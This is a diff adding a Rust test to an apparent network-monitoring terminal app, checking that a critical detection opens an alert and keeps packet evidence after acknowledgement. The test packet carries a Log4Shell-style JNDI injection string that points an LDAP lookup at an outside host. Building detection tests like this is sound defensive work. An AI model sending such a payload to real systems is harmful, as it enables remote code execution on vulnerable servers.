@@ -109,6 +109,42 @@ async fn q_does_not_quit_in_text_mode() {
     assert_eq!(app.notebook_input, "q");
 }
 
+fn critical_packet() -> packrat_tui::net::packet::Packet {
+    packrat_tui::net::packet::Packet {
+        no: 77,
+        timestamp: 12.5,
+        src: "203.0.113.7".into(),
+        dst: "10.0.0.5".into(),
+        protocol: "HTTP".into(),
+        length: 128,
+        info: "exploit attempt".into(),
+        src_port: Some(44444),
+        dst_port: Some(8080),
+        vlan_id: None,
+        vlan_pcp: None,
+        vlan_dei: None,
+        outer_vlan_id: None,
+        bytes: b"GET /${jndi:ldap://203.0.113.7/x}".to_vec(),
+    }
+}
+
+#[tokio::test]
+async fn critical_detection_requires_review_and_retains_evidence_after_acknowledgement() {
+    let mut app = App::new_for_test();
+    app.inject_packet(critical_packet());
+    assert!(app.alert_overlay_open);
+    assert_eq!(app.incidents.incidents.len(), 1);
+
+    event::handle(&mut app, key(KeyCode::Enter));
+    assert_eq!(app.active_tab, Tab::Analysis);
+    assert_eq!(app.analysis_section, app::INCIDENT_ANALYSIS_SECTION);
+    assert!(!app.alert_overlay_open);
+
+    event::handle(&mut app, key(KeyCode::Char('C')));
+    assert!(app.incidents.active().is_none());
+    assert_eq!(app.incidents.incidents[0].packet_history.len(), 1);
+}
+
 // ─── Global tab switch (numeric keys) ────────────────────────────────────────
 
 #[rstest]
